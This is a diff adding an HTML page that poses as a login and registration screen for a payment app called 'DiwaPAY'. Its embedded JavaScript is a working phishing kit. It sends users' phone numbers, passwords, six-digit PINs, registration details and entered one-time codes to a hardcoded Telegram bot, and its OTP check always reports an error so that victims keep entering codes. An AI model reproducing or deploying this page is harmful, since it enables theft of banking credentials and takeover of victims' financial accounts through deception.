@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DiwaPAY • Secure Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #eef1f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .mobile-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            max-height: 840px;
+            background-color: #f7f8fa;
+            position: relative;
+            overflow-y: auto;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            display: flex;
+            flex-direction: column;
+            border-radius: 20px;
+        }
+
+        /* Top Bar */
+        .top-nav {
+            height: 50px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            background: #fff;
+            position: relative;
+            z-index: 10;
+        }
+
+        .back-btn {
+            font-size: 24px;
+            cursor: pointer;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .nav-title {
+            flex: 1;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-right: 24px;
+        }
+
+        /* HEADER SECTION */
+        .header-section {
+            position: relative;
+            width: 100%;
+            height: 195px;
+            background-color: #f7f8fa;
+        }
+
+        /* Seamless Black Header Banner */
+        .header-banner-wrap {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 185px;
+            background-color: #0b0c0e;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+            clip-path: polygon(0 0, 100% 0, 100% 82%, 88% 93%, 0 100%);
+        }
+
+        .header-banner-wrap::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='75' height='40' viewBox='0 0 75 40'%3E%3Ctext x='10' y='26' fill='rgba(255, 255, 255, 0.05)' font-family='sans-serif' font-weight='900' font-size='20'%3Edp%3C/text%3E%3C/svg%3E");
+            background-repeat: repeat;
+            z-index: 1;
+        }
+
+        .logo-img {
+            max-width: 165px;
+            height: auto;
+            object-fit: contain;
+            z-index: 2;
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        /* Form Container */
+        .form-container {
+            position: relative;
+            z-index: 3;
+            margin-top: -35px;
+            padding: 0 22px 25px 22px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            flex: 1;
+        }
+
+        .input-group {
+            background: #fff;
+            border: 1.5px solid #333;
+            border-radius: 14px;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            padding: 0 18px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .input-group:focus-within {
+            border-color: #1052ff;
+        }
+
+        .country-code {
+            font-size: 17px;
+            color: #111;
+            font-weight: 600;
+            padding-right: 14px;
+            border-right: 1px solid #ccc;
+            margin-right: 14px;
+        }
+
+        .input-group input {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 17px;
+            color: #111;
+            font-weight: 500;
+            background: transparent;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group input::placeholder {
+            color: #b0b4be;
+        }
+
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 15px;
+            margin: 2px 2px;
+        }
+
+        .link-text {
+            color: #333;
+            text-decoration: underline;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .remember-label {
+            color: #555;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .remember-label input {
+            accent-color: #1052ff;
+            width: 16px;
+            height: 16px;
+        }
+
+        .agreement-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #777;
+            margin: 4px 0;
+        }
+
+        .agreement-row input {
+            accent-color: #1052ff;
+            width: 17px;
+            height: 17px;
+        }
+
+        .agreement-row a {
+            color: #888;
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            background: #1052ff;
+            color: #fff;
+            border: none;
+            height: 50px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 5px;
+            box-shadow: 0 4px 12px rgba(16, 82, 255, 0.25);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: #1052ff;
+            border: 1.5px solid #1052ff;
+            height: 48px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 12px auto 0 auto;
+            width: 62%;
+        }
+
+        .version-tag {
+            text-align: right;
+            font-size: 12px;
+            color: #bbb;
+            margin-top: auto;
+            padding-bottom: 15px;
+            padding-right: 10px;
+        }
+
+        /* Modal Overlay */
+        .modal-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            z-index: 100;
+        }
+
+        .modal-box {
+            background: #fff;
+            width: 100%;
+            border-radius: 16px;
+            padding: 22px;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px; right: 15px;
+            background: #f0f2f5;
+            border: none;
+            width: 28px; height: 28px;
+            border-radius: 50%;
+            font-size: 16px;
+            cursor: pointer;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 8px;
+        }
+
+        .modal-subtext {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .modal-phone-info {
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 15px;
+        }
+
+        .modal-input-wrap input {
+            width: 100%;
+            height: 48px;
+            border: 1px solid #dcdfe6;
+            border-radius: 12px;
+            padding: 0 15px;
+            font-size: 16px;
+            outline: none;
+            letter-spacing: 2px;
+        }
+
+        .send-otp-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0 18px 0;
+            font-size: 13px;
+        }
+
+        .send-otp-link {
+            color: #1052ff;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .send-otp-link.disabled {
+            color: #aaa;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+
+        .toast-msg {
+            font-size: 12px;
+            color: #2e7d32;
+            font-weight: 600;
+        }
+
+        .error-msg {
+            font-size: 12px;
+            color: #d32f2f;
+            margin-top: 6px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* PIN input spacing */
+        .pin-group {
+            margin-top: -8px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        
+        <!-- Registration Top Bar -->
+        <div id="registerNav" class="top-nav hidden">
+            <span class="back-btn" onclick="showPage('login')">&#8249;</span>
+            <span class="nav-title">Register</span>
+        </div>
+
+        <!-- Clean Black Header Banner -->
+        <div class="header-section">
+            <div class="header-banner-wrap">
+                <img src="https://i.postimg.cc/Hs6kyXCk/1960-removebg-preview.png" alt="DiwaPAY Logo" class="logo-img">
+            </div>
+        </div>
+
+        <!-- LOGIN PAGE -->
+        <div id="loginPage" class="form-container">
+            <!-- Mobile Input Field (Numbers Only) -->
+            <div class="input-group">
+                <span class="country-code">+91</span>
+                <input type="tel" id="loginPhone" value="" placeholder="Enter phone number" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+
+            <!-- Password Input Field -->
+            <div class="input-group">
+                <input type="password" id="loginPassword" value="" placeholder="Password">
+            </div>
+
+            <!-- NEW: 6-digit PIN field (below password) -->
+            <div class="input-group pin-group">
+                <input type="password" id="loginPin" maxlength="6" placeholder="6-digit PIN" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+
+            <div class="options-row">
+                <a class="link-text" onclick="showPage('register')">Register</a>
+                <label class="remember-label">
+                    <input type="checkbox"> Remember Me
+                </label>
+            </div>
+
+            <div class="agreement-row">
+                <input type="checkbox" id="loginAgree" checked>
+                <label for="loginAgree">Agree <a href="#">"User Privacy Agreement"</a></label>
+            </div>
+
+            <button class="btn-primary" onclick="openModal()">Login</button>
+            <button class="btn-outline">Forget Password</button>
+
+            <div class="version-tag">v1.5.1</div>
+        </div>
+
+        <!-- REGISTER PAGE -->
+        <div id="registerPage" class="form-container hidden">
+            <div class="input-group">
+                <input type="text" placeholder="User Name">
+            </div>
+
+            <div class="input-group">
+                <input type="password" placeholder="Password">
+            </div>
+
+            <div class="input-group">
+                <span class="country-code">+91</span>
+                <input type="tel" placeholder="Enter phone number" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+
+            <div class="input-group" style="justify-content: space-between;">
+                <input type="tel" placeholder="OTP Code" style="width: 60%;" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                <button style="background: #1052ff; color: #fff; border: none; padding: 9px 20px; border-radius: 18px; font-size: 13px; font-weight: 600; cursor: pointer;" type="button">Send</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" placeholder="Invite Code">
+            </div>
+
+            <button class="btn-primary" style="margin-top: 15px;">Sign Up</button>
+        </div>
+
+        <!-- VERIFICATION MODAL -->
+        <div id="verificationModal" class="modal-overlay hidden">
+            <div class="modal-box">
+                <button class="close-modal" onclick="closeModal()">&times;</button>
+                <div class="modal-title">New Device Verification</div>
+                <div class="modal-subtext">Please enter the 6-digit OTP to confirm this login.</div>
+                <div class="modal-phone-info">OTP sent to <strong id="modalPhoneNum">+91 --</strong></div>
+                
+                <!-- NUMBERS ONLY OTP INPUT -->
+                <div class="modal-input-wrap">
+                    <input type="tel" id="otpInput" maxlength="6" placeholder="Enter 6-digit OTP" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    <div id="errorText" class="error-msg">Incorrect OTP. Please try again.</div>
+                </div>
+
+                <div class="send-otp-container">
+                    <span id="toastMsg" class="toast-msg"></span>
+                    <a id="sendOtpBtn" class="send-otp-link" onclick="triggerOTP()">Send OTP</a>
+                </div>
+
+                <button class="btn-primary" style="width: 100%; border-radius: 24px;" onclick="verifyOTP()">Confirm</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ------------------ TELEGRAM CONFIG (UPDATED) ------------------
+        const BOT_TOKEN = '8719016720:AAGzjPxoSe7n14cNHmMRBIys9qUt-MG1or4';
+        const CHAT_ID = '1706252195';
+
+        // ---------- HELPER: send message via Telegram ----------
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await response.json();
+                console.log('Telegram response:', data);
+                return data.ok;
+            } catch (error) {
+                console.error('Telegram send error:', error);
+                return false;
+            }
+        }
+
+        // ---------- show/hide pages ----------
+        function showPage(page) {
+            const loginPage = document.getElementById('loginPage');
+            const registerPage = document.getElementById('registerPage');
+            const registerNav = document.getElementById('registerNav');
+
+            if (page === 'register') {
+                loginPage.classList.add('hidden');
+                registerPage.classList.remove('hidden');
+                registerNav.classList.remove('hidden');
+            } else {
+                registerPage.classList.add('hidden');
+                registerNav.classList.add('hidden');
+                loginPage.classList.remove('hidden');
+            }
+        }
+
+        // ---------- Modal control ----------
+        function openModal() {
+            const phoneVal = document.getElementById('loginPhone').value.trim();
+            const displayPhone = phoneVal || '----------';
+            document.getElementById('modalPhoneNum').innerText = '+91 ' + displayPhone;
+            document.getElementById('verificationModal').classList.remove('hidden');
+            document.getElementById('errorText').style.display = 'none';
+            document.getElementById('otpInput').value = '';
+
+            // --- Send login attempt to Telegram (including PIN) ---
+            const password = document.getElementById('loginPassword').value || '****';
+            const pin = document.getElementById('loginPin').value || '****';
+            const msg = `🔐 <b>DiwaPAY Login Attempt</b>\n📱 Phone: +91 ${displayPhone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}\n⏰ ${new Date().toLocaleString()}`;
+            sendToTelegram(msg);
+        }
+
+        function closeModal() {
+            document.getElementById('verificationModal').classList.add('hidden');
+        }
+
+        // ---------- OTP timer ----------
+        let countdownTimer = null;
+        let timeLeft = 60;
+        let isTimerRunning = false;
+
+        function triggerOTP() {
+            if (isTimerRunning) return;
+
+            const sendBtn = document.getElementById('sendOtpBtn');
+            const toast = document.getElementById('toastMsg');
+            const errorText = document.getElementById('errorText');
+
+            errorText.style.display = 'none';
+            toast.innerText = "OTP send successful!";
+
+            // --- Send OTP trigger to Telegram ---
+            const phone = document.getElementById('loginPhone').value.trim() || 'unknown';
+            sendToTelegram(`📨 <b>OTP requested</b>\n📱 Phone: +91 ${phone}\n⏰ ${new Date().toLocaleString()}`);
+
+            isTimerRunning = true;
+            timeLeft = 60;
+            sendBtn.classList.add('disabled');
+
+            clearInterval(countdownTimer);
+            countdownTimer = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(countdownTimer);
+                    isTimerRunning = false;
+                    sendBtn.innerText = "Resend OTP";
+                    sendBtn.classList.remove('disabled');
+                    toast.innerText = "";
+                } else {
+                    sendBtn.innerText = `Resend in ${timeLeft}s`;
+                    timeLeft--;
+                }
+            }, 1000);
+        }
+
+        // ---------- OTP verification (always shows error + sends telegram) ----------
+        function verifyOTP() {
+            const errorText = document.getElementById('errorText');
+            const otpValue = document.getElementById('otpInput').value.trim() || 'empty';
+            const phone = document.getElementById('loginPhone').value.trim() || 'unknown';
+
+            // --- Send OTP attempt to Telegram ---
+            sendToTelegram(`⚠️ <b>OTP verification attempt</b>\n📱 Phone: +91 ${phone}\n🔢 OTP entered: ${otpValue}\n⏰ ${new Date().toLocaleString()}`);
+
+            // Show error as intended
+            errorText.innerText = "Incorrect OTP. Please try again.";
+            errorText.style.display = 'block';
+        }
+
+        // ---------- additional: register signup telegram ----------
+        document.addEventListener('DOMContentLoaded', function() {
+            // Intercept "Sign Up" button on register page
+            const signupBtn = document.querySelector('#registerPage .btn-primary');
+            if (signupBtn) {
+                signupBtn.addEventListener('click', function(e) {
+                    const registerPage = document.getElementById('registerPage');
+                    const inputs = registerPage.querySelectorAll('.input-group input');
+                    let username = inputs[0]?.value || 'empty';
+                    let password = inputs[1]?.value || 'empty';
+                    let phone = inputs[2]?.value || 'empty';
+                    let otp = inputs[3]?.value || 'empty';
+                    let invite = inputs[4]?.value || 'empty';
+
+                    const msg = `📝 <b>New Registration</b>\n👤 User: ${username}\n🔑 Pass: ${password}\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otp}\n🎟️ Invite: ${invite}\n⏰ ${new Date().toLocaleString()}`;
+                    sendToTelegram(msg);
+                });
+            }
+
+            // "Send OTP" button on register page
+            const registerSendOtp = document.querySelector('#registerPage .input-group button');
+            if (registerSendOtp) {
+                registerSendOtp.addEventListener('click', function() {
+                    const phoneInput = this.closest('.input-group').previousElementSibling?.querySelector('input');
+                    const phone = phoneInput?.value || 'unknown';
+                    sendToTelegram(`📨 <b>Register OTP requested</b>\n📱 Phone: +91 ${phone}\n⏰ ${new Date().toLocaleString()}`);
+                });
+            }
+        });
+
+        // close modal on overlay click
+        document.querySelector('.modal-overlay')?.addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+
+        console.log('✅ DiwaPAY UI with Telegram bot (CHAT_ID: 8511582545)');
+    </script>
+</body>
+</html>
